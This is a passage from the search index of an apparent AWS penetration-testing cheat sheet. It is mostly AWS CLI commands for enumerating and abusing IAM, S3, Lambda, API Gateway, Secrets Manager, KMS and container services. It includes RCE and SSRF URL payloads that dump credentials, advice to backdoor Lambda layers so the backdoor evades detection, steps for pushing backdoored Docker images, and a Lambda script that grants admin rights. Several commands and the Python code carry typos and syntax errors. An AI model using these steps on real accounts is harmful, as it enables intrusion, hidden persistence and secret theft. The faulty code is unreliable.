inline policies of our user","text":"<pre><code>aws iam list-user-policies --user-name example_name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-a-restricted-resource-example-s3","title":"Listing a restricted resource (Example S3)","text":"<pre><code>aws s3 ls --profile example_profile\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#interesting-permissions","title":"Interesting Permissions","text":"<ul> <li>iam:AttachUserPolicy -&gt; Attach a policy to a user</li> <li>iam:AttachGroupPolicy -&gt; Attach a policy to a group</li> <li>iam:AttachRolePolicy -&gt; Attach a policy to a role </li> <li>iam:CreateAccessKey -&gt; Creates a new access key</li> <li>iam:CreateLoginProfile -&gt; Creates a new login profile </li> <li>iam:UpdateLoginProfile -&gt; Update an existing login profile</li> <li>iam:PassRole and ec2:RunInstances -&gt; Creates an EC2 instance with an existing instance profile</li> <li>iam:PuserUserPolicy -&gt; Create/Update an inline policy</li> <li>iam:PutGroupPolicy -&gt; Create/Update an inline policy for a group</li> <li>iam:PutRolePolicy -&gt; Create/Update an inline policy for a role </li> <li>iam:AddUserToGroup -&gt; Add an user to a group</li> <li>iam:UpdateAssumeRolePolicy and sts:AssumeRole -&gt; Update the AssumeRolePolicyDocument of a role </li> <li>iam:PassRole,lambda:CreateFunction and lambda:InvokeFunction -&gt; Pass a role to a new lambda function and invoke it</li> <li>lambda:UpdateFunctionCode -&gt; Update the code of an existing lambda function</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#persistence-backdooring","title":"Persistence &amp; Backdooring","text":"<ul> <li>Suppose we have two users, the user A has permissions to create Access Keys to user B, this misconfig allows us to create an access key for user B and persist our access. </li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#creating-a-new-access-key-for-another-user","title":"Creating a new access key for another user","text":"<pre><code>aws iam create-access-key --username example_username\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#configuring-aws-cli-for-the-new-user","title":"Configuring AWS cli for the new user","text":"<pre><code>aws configure --profile example_profile\n</code></pre> <p>Remember, an user can have the maximum of 2 access keys.</p>"},{"location":"cloud/aws/AWS%20Pentest/#testing-the-credential","title":"Testing the credential","text":"<pre><code>aws sts get-caller-identity --profile example_profile\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#accessing-more-credentials","title":"Accessing more credentials","text":"<ul> <li>It's possible to assume other roles with the sts:AssumeRole permission (Example: An user doesn't have access to an s3 instance, but it has this permission, we can easily assume other roles if we are in the trust relashionship, increasing our access in the instance)</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#listing-managed-policies-attached-to-a-user","title":"Listing managed policies attached to a user","text":"<pre><code>aws iam list-attached-user-policies --user-name example_name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#retrieving-information-about-a-specific-policy","title":"Retrieving information about a specific policy","text":"<pre><code>aws iam get-policy --policy-arn ARN\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-the-version-of-the-policy","title":"Listing information about the version of the policy","text":"<pre><code>aws iam list-policy-versions --policy-arn ARN\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#retrieving-information-about-a-specific-version","title":"Retrieving information about a specific version","text":"<pre><code>aws iam get-policy-version --policy-arn policy_arn --version-id ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-iam-roles_1","title":"Listing IAM roles","text":"<pre><code>aws iam list-roles\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-trust-relationship-between-role-and-user-which-roles-we-can-assume","title":"Listing trust relationship between role and user (Which roles we can assume)","text":"<pre><code>aws iam get-role --role-name role_name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-all-managed-policies-attached-to-the-specific-iam-role","title":"Listing all managed policies attached to the specific IAM role","text":"<pre><code>aws iam liast-attached-role-policies --role-name role_name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#retrieving-information-about-the-specified-version-of-the-policy","title":"Retrieving information about the specified version of the policy","text":"<pre><code>aws iam get-policy-version --policy-arn policy_arn --version-id ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-temporary-credentials-for-the-role","title":"Getting temporary credentials for the role","text":"<pre><code>aws sts assume-role --role-arn role_arn --role-session-name session_name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#configuring-aws-cli-with-newer-credentials-on-linux","title":"Configuring AWS cli with newer credentials (On Linux)","text":"<pre><code>export AWS_ACCESS_KEY_ID\nexport AWS_SECRET_KEY\nexport AWS_SESSION_TOKEN\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-information-about-the-temporary-credential","title":"Getting information about the temporary credential","text":"<pre><code>aws sts get-caller-identity\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#s3-simple-storage-system","title":"S3 - Simple Storage System","text":"<ul> <li>Storage system that allows users to store and retrieve data.</li> <li>List,Get,Put and Delete operations can be performed on the objects of the bucket</li> <li>Buckets are global, meaning that they are available to all regions</li> <li>It's possible to bruteforce the bucket name and region in the URL</li> <li>Its possible to apply ACL's to bucket and object level and bucket policies for bucket level</li> <li>There is also time limited URL's and identity-based policies</li> <li>Identity policies are enumerated using IAM commands</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#enumeration","title":"Enumeration","text":""},{"location":"cloud/aws/AWS%20Pentest/#listing-all-buckets-in-aws-account","title":"Listing all buckets in aws account","text":"<pre><code>aws s3api list-buckets\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-information-about-a-specific-bucket","title":"Getting information about a specific bucket","text":"<pre><code>aws s3api get-bucket-acl --bucket name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-information-about-a-specific-bucket-policy","title":"Getting information about a specific bucket policy","text":"<pre><code>aws s3api get-bucket-policy --bucket name \n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-the-public-access-block-configuration-for-an-s3-bucket","title":"Getting the Public Access Block configuration for an S3 bucket","text":"<pre><code>aws s3api get-public-access-block --bucket name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-all-objects-in-a-specific-bucket","title":"Listing all objects in a specific bucket","text":"<pre><code>aws s3api list-objects --bucket name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-acl-information-about-a-specific-object","title":"Getting ACL information about a specific object","text":"<pre><code>aws s3api get-object-acl --bucket-name name --key object_name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#data-exfiltration","title":"Data Exfiltration","text":"<ul> <li>It's possible to brute-force files in the bucket</li> <li>If the bucket is misconfigured, we can read data through web browser, cli/api or time-based URL.</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#public-access","title":"Public Access","text":"<ul> <li>Just enter the URL in the browser</li> </ul> <pre><code>https://bucket-name.region.amazonaws.com/secret.txt\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#authenticated-user","title":"Authenticated User","text":"<pre><code>aws s3api get-object --bucket name --key object-name download-file-location\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#time-based-url","title":"Time-Based Url","text":"<ul> <li>Generate a time-based url for an object</li> <li>Userful if the object is not public</li> </ul> <pre><code>aws s3 presign s3://bucket-name/object-name --expires-in 605000\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#lambda-api-gateway","title":"Lambda &amp; API Gateway","text":"<ul> <li>Serverless event-driven platform</li> <li>Runs code in response to events and automatically manages computing resources required by that code</li> <li>Can trigger from other AWS services or call directly from the API Gateway</li> <li>A lambda function is a piece of code that is executed whenever is triggered by an event from an event source</li> <li>API Gateway is an AWS service for creating, publishing, maintaining, monitoring and securing REST, HTTP and WebSocket API</li> <li>API Gateway can be used to trigger lambda functions in a synchronous (api gateway), asynchronous (event) or stream (Poll Based) way.</li> <li>If we found a lambda function that access an S3 (Example) its possible to change its code and gain access to the files.</li> <li>If API Gateway is used, we can enumerate the API to see how its possible to invoke the lambda function (Craft the URL).</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#enumeration_1","title":"Enumeration","text":""},{"location":"cloud/aws/AWS%20Pentest/#listing-all-lambda-functions","title":"Listing All lambda functions","text":"<pre><code>aws lambda list-functions\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-a-specific-lambda-function","title":"Listing information about a specific lambda function","text":"<pre><code>aws lambda get-function --function-name function_name\n</code></pre> <ul> <li>This command enables us to download the source code of the lambda function</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#listing-policy-information-about-the-function","title":"Listing policy information about the function","text":"<pre><code>aws lambda get-policy --function-name function_name\n</code></pre> <ul> <li>We can get information like who can execute this functions, ID and other information with this command</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#listing-the-event-source-mapping-information-about-a-lambda-function","title":"Listing the event source mapping information about a lambda function","text":"<pre><code>aws lambda list-event-source-mappings --function-name function_name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-lambda-layers-depedencies","title":"Listing Lambda Layers (Depedencies)","text":"<pre><code>aws lambda list-layers\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-full-information-about-a-lambda-layer","title":"Listing full information about a lambda layer","text":"<pre><code>aws lambda get-layer-version --layer-name name --version-number version_number\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-rest-apis","title":"Listing Rest API'S","text":"<pre><code>aws apigateway get-rest-apis\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-a-specific-api","title":"Listing information about a specific API","text":"<pre><code>aws apigateway get-rest-api --rest-api-id ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-endpoints","title":"Listing information about endpoints","text":"<pre><code>aws apigateway get-resources --rest-api-id ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-a-specific-endpoint","title":"Listing information about a specific endpoint","text":"<pre><code>aws apigateway get-resource --rest-api-id ID --resource-id ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-method-information-for-the-endpoint","title":"Listing method information for the endpoint","text":"<pre><code>aws apigateway get-method --rest-api-id ApiID --resource-id ID --http-method method\n</code></pre> <ul> <li>Test various methods to see if the API supports it.</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#listing-all-versions-of-a-rest-api","title":"Listing all versions of a rest api","text":"<pre><code>aws apigateway get-stages --rest-api-id ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-informatin-about-a-specific-version","title":"Getting informatin about a specific version","text":"<pre><code>aws apigateway get-stage --res-api-id ID --stage-name NAME\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-api-keys","title":"Listing API KEYS","text":"<pre><code>aws apigateway get-api-keys --include-values\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-information-about-a-specific-api-key","title":"Getting information about a specific API Key","text":"<pre><code>aws apigateway get-api-key --api-key KEY\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#initial-access","title":"Initial Access","text":"<ul> <li>It's possible to get RCE through API Gateway if it executes commands.</li> <li>If you can execute commands, there is a way to retrieve keys from the API Gateway, just use <code>env</code>, configure <code>aws cli</code> and proceed with the exploitation.</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#credential-access","title":"Credential Access","text":"<p>Getting credentials from Lambda can be done in 2 ways</p> <ol> <li>Keys in the source code</li> <li>Keys in the environment variables</li> </ol> <p>These keys can be gathered using SSRF, RCE and so on.</p>"},{"location":"cloud/aws/AWS%20Pentest/#getting-credentials-using-rce","title":"Getting credentials using RCE","text":"<pre><code>https://apigateway/prod/system?cmd=env\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-credentials-using-ssrf","title":"Getting credentials using SSRF","text":"<pre><code>https://apigateway/prod/example?url=http://localhost:9001/2018-06-01/runtime/invocation/next\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-credentials-using-ssrf-and-wrappers","title":"Getting credentials using SSRF and wrappers","text":"<pre><code>https://apigateway/prod/system?cmd=file:///proc/self/environ\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-credentials-from-lambda-environment-variables-cli","title":"Getting credentials from lambda environment variables (cli)","text":"<pre><code>aws lambda get-function --function-name NAME\n</code></pre> <ul> <li>It's important to enumerate the functions first with <code>aws lambda list-functions</code></li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#persistence","title":"Persistence","text":"<ul> <li>If the user has sufficient rights in the lambda function, it's possible to download the source code, add a backdoor to it and upload. Every time the lambda executes, the malicious code will also execute.</li> <li>Always try to update the code of layers (dependencies) instead of the actual lambda code, this way our backdoor will be difficult to detect.</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#checking-which-user-is-executing","title":"Checking which user is executing","text":"<pre><code>aws sts get-caller-identity\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#checking-all-managed-policies-attached-to-the-user","title":"Checking all managed policies attached to the user","text":"<pre><code>aws iam list-attached-user-policies --user-name user_name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#checking-informations-about-a-specific-policy","title":"Checking informations about a specific policy","text":"<pre><code>aws iam get-policy-version --policy-arn arn --version-id ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-all-lambda-functions_1","title":"Listing all lambda functions","text":"<pre><code>aws lambda list-functions --region region\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-the-specified-lambda","title":"Listing information about the specified lambda","text":"<pre><code>aws lambda get-function --function-name name\n</code></pre> <ul> <li>Download and analyze the codes</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#listing-policy-information-about-the-specific-lambda-function","title":"Listing policy information about the specific lambda function","text":"<pre><code>aws lambda get-policy --function-name name --profile profile --region region\n</code></pre> <ul> <li>We can grab informations like id, who can invoke and other details with this command (Helps to build the query to execute the lambda function).</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#listing-rest-apis_1","title":"Listing Rest API'S","text":"<pre><code>aws apigateway get-rest-apis\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-a-specific-api_1","title":"Listing information about a specific API","text":"<pre><code>aws apigateway get-rest-api --rest-api-id ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-endpoints_1","title":"Listing information about endpoints","text":"<pre><code>aws apigateway get-resources --rest-api-id ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-a-specific-endpoint_1","title":"Listing information about a specific endpoint","text":"<pre><code>aws apigateway get-resource --rest-api-id ID --resource-id ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-method-information-for-the-endpoint_1","title":"Listing method information for the endpoint","text":"<pre><code>aws apigateway get-method --rest-api-id ApiID --resource-id ID --http-method method\n</code></pre> <ul> <li>Test various methods to see if the API supports it.</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#listing-all-versions-of-a-rest-api_1","title":"Listing all versions of a rest api","text":"<pre><code>aws apigateway get-stages --rest-api-id ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-informatin-about-a-specific-version_1","title":"Getting informatin about a specific version","text":"<pre><code>aws apigateway get-stage --res-api-id ID --stage-name NAME\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#uploading-the-backdoor-code-to-aws-lambda-function","title":"Uploading the backdoor code to aws lambda function","text":"<pre><code>aws lambda update-function-code --function-name function --zip-file fileb://my-function.zip\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#invoke-the-function","title":"Invoke the Function","text":"<pre><code>curl https://uj3948ie.execute-api.us-east-2.amazonaws.com/default/EXAMPLE\n</code></pre> <p>Where</p> <ol> <li>API-ID -&gt; uj3948ie</li> <li>Region -&gt; us-east-2</li> <li>Resource (Endpoint) -&gt; EXAMPLE</li> <li>Method -&gt; Get</li> <li>Stage (Version) -&gt; default</li> <li>API-Key -&gt; None</li> </ol> <p>All these details are gathered during the enumeration.</p>"},{"location":"cloud/aws/AWS%20Pentest/#privilege-escalation_1","title":"Privilege Escalation","text":"<ul> <li>If we have a user with PassRole and CreateFunction roles and also AttachRolePolicy role in a Lambda Function, its possible to create a function with a code that changes the lambda role to admin then the user to Administrator.</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#create-a-lambda-function-and-attach-a-role-to-it","title":"Create a lambda function and attach a role to it","text":"<pre><code>aws lambda create-function --function-name my-function --runtime python3.7 --zip-file fileb://my-function.zip --handler my-function.handler --role ARN --region region\n</code></pre> <ul> <li>Inside the function's code, we will add the administrator permission to the role and to the user</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#example-code-to-add-the-permissions","title":"Example code to add the permissions","text":"<pre><code>import boto3\nimport json\n\ndef handler(event,context)\n    iam = boto3.client(\"iam\")\n    iam.attach.role.policy(RoleName=\"name\",PolicyArn=\"arn\",)\n    iam.attach.user.policy(UserName=\"name\",PolicyArn=\"arn\",)\n    return {\n        'statusCode':200\n        'body':json.dumps(\"Pwned\")\n    }\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#invoke-a-lambda-function","title":"Invoke a lambda function","text":"<pre><code>aws lambda invoke --function-name name response.json --region region \n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-managed-policies-to-see-if-the-change-worked","title":"Listing managed policies to see if the change worked","text":"<pre><code>aws iam list-attached-user-policies --user-name user_name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#aws-secret-manager","title":"AWS Secret Manager","text":"<ul> <li>AWS Service that encrypts and stores secrets</li> <li>Transparently decrypts and returns in plaintext</li> <li>KMS used to store keys (AWS Key and Customer Managed Key)</li> <li>Asymmetric and Symmetric keys can be created using KMS</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#enumeration_2","title":"Enumeration","text":""},{"location":"cloud/aws/AWS%20Pentest/#listing-all-secrets-stored-by-secret-manager","title":"Listing all secrets stored by Secret Manager","text":"<pre><code>aws secretsmanager list-secrets\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-a-specific-secret","title":"Listing information about a specific secret","text":"<pre><code>aws secretsmanager describe-secret --secret-id name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-policies-attached-to-the-specified-secret","title":"Getting policies attached to the specified secret","text":"<pre><code>aws secretsmanager get-resource-policy --secret-id ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-keys-in-kms","title":"Listing keys in KMS","text":"<pre><code>aws kms list-keys\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-a-specific-key","title":"Listing information about a specific key","text":"<pre><code>aws kms describe-key --key-id ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-policies-attached-to-a-specific-key","title":"Listing policies attached to a specific key","text":"<pre><code>aws kms list-key-policies --key-id ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-full-information-about-a-policy","title":"Getting full information about a policy","text":"<ul> <li>Shows who can access the keys</li> </ul> <pre><code>aws kms get-key-policy --policy-name name --key-id ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#credential-exfiltration","title":"Credential Exfiltration","text":"<ul> <li>If the user has access to Secret Manager, it can decrypt the secrets using the web, cli or API</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#listing-policies-attached-to-a-user","title":"Listing policies attached to a user","text":"<pre><code>aws iam list-attached-user-policies --user-name name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#retrieving-information-about-a-specific-version-of-the-policy","title":"Retrieving information about a specific version of the policy","text":"<ul> <li>Here we can see the permissions</li> </ul> <pre><code>aws iam get-policy-version --policy-arn arn --version-id id\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-all-secrets-stored-by-the-secret-manager","title":"Listing all secrets stored by the Secret Manager","text":"<pre><code>aws secretsmanager list-secrets\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-a-specific-secret_1","title":"Listing information about a specific secret","text":"<ul> <li>Here we get the secret Key Id to describe the secret</li> </ul> <pre><code>aws secretsmanager describe-secret --secret-id name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-resource-based-policy-attached-to-a-specific-secret","title":"Getting resource-based policy attached to a specific secret","text":"<pre><code>aws secretsmanager get-resource-policy --secret-id ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-the-secret-value","title":"Getting the secret value","text":"<ul> <li>Retrieves the actual value</li> </ul> <pre><code>aws secretsmanager get-secret-value --secret-id ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#kms","title":"KMS","text":"<ul> <li>If we compromised as an example an S3 with an encrypted file, we can decrypt it using the keys stored in KMS.</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#listing-a-specific-key","title":"Listing a specific key","text":"<pre><code>aws kms describe-key --key-id id\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-policies-attached-to-a-specified-key","title":"Listing policies attached to a specified key","text":"<ul> <li>Here we can see who can access the key, the description of it and so on</li> </ul> <pre><code>aws kms list-key-policies --key-id ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-full-information-about-a-policy","title":"Listing full information about a policy","text":"<ul> <li>Run the previous command in all keys to see who can access it</li> </ul> <pre><code>aws kms get-key-policy --policy-name name --key-id ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#decrypt-the-secret-using-the-key","title":"Decrypt the secret using the key","text":"<ul> <li>There is no need to specify the key information because this information is embedded in the encrypted file</li> </ul> <pre><code>aws kms decrypt --ciphertext-blob fileb://EncryptedFile --output text --query plaintext\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#containers","title":"Containers","text":"<p>Divided into three categories</p> <ul> <li>Registry -&gt; Secure place to store container images (ECR)</li> <li>Orchestration -&gt; Configure when and where the containers run (ECS, EKS)</li> <li>Compute -&gt; Use to do computing-related tasks (EC2, Fargate)</li> <li>Is it possible to create a backdoor image and add to a EKS  cluster</li> <li>Always look how VPC's are communicating with each other, maybe is possible to pivot through the EKS VPC from other VPC and compromise the entire cluster</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#initial-access_1","title":"Initial Access","text":"<ul> <li>The initial access can be done by exploiting some RCE in web app to get access to the container, afterwards it's possible to compromise the EC2. </li> </ul> <p>After the RCE, we can list all secrets in EKS</p> <pre><code>https://website.com?rce.php?cmd=ls /var/run/secrets/kubernets.io/serviceaccount\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-the-secret-information-from-eks","title":"Getting the secret information from EKS","text":"<pre><code>https://website.com?rce.php?cmd=ls /var/run/secrets/kubernets.io/serviceaccount/token\n</code></pre> <ul> <li>It's also possible to do sandbox escaping (Tool: <code>deepce</code>)</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#enumeration_3","title":"Enumeration","text":""},{"location":"cloud/aws/AWS%20Pentest/#ecr","title":"ECR","text":""},{"location":"cloud/aws/AWS%20Pentest/#listing-all-repositories-in-container-registry","title":"Listing all repositories in container registry","text":"<pre><code>aws ecr describe-repositories\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-repository-policy","title":"Listing information about repository policy","text":"<pre><code>aws ecr get-repository-policy --repository-name name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-all-images-in-a-specific-repository","title":"Listing all images in a specific repository","text":"<pre><code>aws ecr list-images --repository-name name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-an-image","title":"Listing information about an image","text":"<pre><code>aws ecr describe-images --repository-name name --images-ids imageTag=name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#ecs","title":"ECS","text":""},{"location":"cloud/aws/AWS%20Pentest/#listing-all-ecs-clusters","title":"Listing all ECS clusters","text":"<pre><code>aws ecs list-clusters\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-a-specific-cluster","title":"Listing information about a specific cluster","text":"<pre><code>aws ecs describe-clusters --cluster name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-all-services-in-a-specified-cluster","title":"Listing all services in a specified cluster","text":"<pre><code>aws ecs list-services --cluster name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-a-specific-service","title":"Listing information about a specific service","text":"<pre><code>aws ecs descibe-services --cluster name --services name\n</code></pre> <ul> <li>This command shows the logs of the service</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#listing-tasks-in-a-specific-cluster","title":"Listing tasks in a specific cluster","text":"<pre><code>aws ecs list-tasks --cluster name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-a-specific-task","title":"Listing information about a specific task","text":"<pre><code>aws ecs describe-tasks --cluster name -tasks taskArn\n</code></pre> <ul> <li>Also shows information about network, userful if trying to pivot</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#listing-all-containers-in-a-specified-cluster","title":"Listing all containers in a specified cluster","text":"<pre><code>aws ecs list-container-instances --cluster name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#eks","title":"EKS","text":""},{"location":"cloud/aws/AWS%20Pentest/#listing-all-eks-clusters","title":"Listing all EKS clusters","text":"<pre><code>aws eks list-clusters\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-a-specific-cluster_1","title":"Listing information about a specific cluster","text":"<pre><code>aws eks describe-cluster --name name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-all-node-groups-in-a-specified-cluster","title":"Listing all node groups in a specified cluster","text":"<pre><code>aws eks list-nodegroups --cluster-name name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-specific-information-about-a-node-group-in-a-cluster","title":"Listing specific information about a node group in a cluster","text":"<pre><code>aws eks describe-nodegroup --cluster-name name --nodegroup-name name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-fargate-in-a-specified-cluster","title":"Listing Fargate in a specified cluster","text":"<pre><code>aws eks list-fargate-profiles --cluster-name cluster-name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-a-fargate-profile-in-a-cluster","title":"Listing information about a fargate profile in a cluster","text":"<pre><code>aws eks describe-fargate-profiles --cluster-name name --fargate-profile-name name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#persistence_1","title":"Persistence","text":"<ul> <li>It's possible to modify an existing docker image with a backdoor, when this image is used it will trigger our team server.</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#enumerating-the-user","title":"Enumerating the user","text":"<pre><code>aws sts get-caller-identity\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-manager-policies-attached-to-the-iam-role","title":"Listing manager policies attached to the IAM role","text":"<pre><code>aws iam list-attached-role-policies --role-name name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-information-about-the-version-of-the-managed-policy","title":"Getting information about the version of the managed policy","text":"<pre><code>aws iam get-policy-version --policy-arn arn --version-id id\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-information-about-the-repositories-in-container-registry","title":"Getting information about the repositories in container registry","text":"<pre><code>aws ecr describe-repositories\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-all-images-in-the-repository","title":"Listing all images in the repository","text":"<pre><code>aws ecr list-images --repository-name name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-an-image_1","title":"Listing information about an image","text":"<pre><code>aws ecr describe-images --repository-name name --image-ids imageTag=Name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#authenticate-the-docker-daemon-to-ecr","title":"Authenticate the docker daemon to ECR","text":"<pre><code>aws ecr get-login-password --region region | docker login --username AWS --password-stdin ecr_address\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#building-images-with-backdoor","title":"Building images with backdoor","text":"<pre><code>docker build -t image_name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#tagging-the-docker-image","title":"Tagging the docker image","text":"<pre><code>docker tag image_name ecr_addr:Image_Name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#pushing-the-image-to-ecr","title":"Pushing the image to ECR","text":"<pre><code>docker push ecr_addr:Image_Name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#ec2","title":"EC2","text":"<ul> <li>AMI, images used to create virtual machines</li> <li>It's possible to create a malicious image to compromise users</li> <li>We can access an instance using SSH Keys, EC2 Instance Connect, Session Manager</li> <li>The SSH Key method is permanent, we need to gather the private key to connect to the instance</li> <li>EC2 Instance connect is an IAM right that we can add to a user, enabling us to temporarily connect to an instance</li> <li>Session manager only work in browser and it does not need SSH Key</li> <li>Windows machines can be accessed by using RDP, Session Manager</li> <li>Security Groups acts as a virtual firewall to control inbound and outbound traffic, acts at the instance level, not the subnet level.</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#enumeration_4","title":"Enumeration","text":""},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-all-instances","title":"Listing information about all instances","text":"<pre><code>aws ec2 describe-instances\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-a-specific-region","title":"Listing information about a specific region","text":"<pre><code>aws ec2 describe-instances --region region\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-specific-instance","title":"Listing information about specific instance","text":"<pre><code>aws ec2 describe-instances --instance-ids ID\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#extracting-userdata-attribute-of-specified-instance","title":"Extracting UserData attribute of specified instance","text":"<pre><code>aws ec2 describe-instance-attribute --attribute userData --instance-id 